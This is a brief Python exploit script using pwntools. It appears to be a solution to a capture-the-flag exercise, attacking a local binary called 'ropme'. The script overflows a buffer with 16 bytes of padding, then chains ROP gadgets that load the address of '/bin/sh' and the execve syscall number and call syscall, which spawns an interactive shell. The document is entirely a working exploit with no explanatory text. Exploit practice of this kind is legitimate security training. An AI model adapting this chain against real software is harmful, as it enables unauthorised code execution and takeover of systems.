from pwn import *


p = process("./ropme")

pause()

payload = b"A" * 16
payload += p64(0x0040118e) #pop rdi rsi
payload += p64(0x00404028) #rdi = &/bin/sh
payload += p64(0) #rsi = 0
payload += p64(0x00401191) #rdx = 0
payload += p64(0x00401195) #pop rax
payload += p64(0x3b) #rax = 0x3b
payload += p64(0x00401197) #syscall

p.sendlineafter(b"ROP!\n", payload)

p.interactive()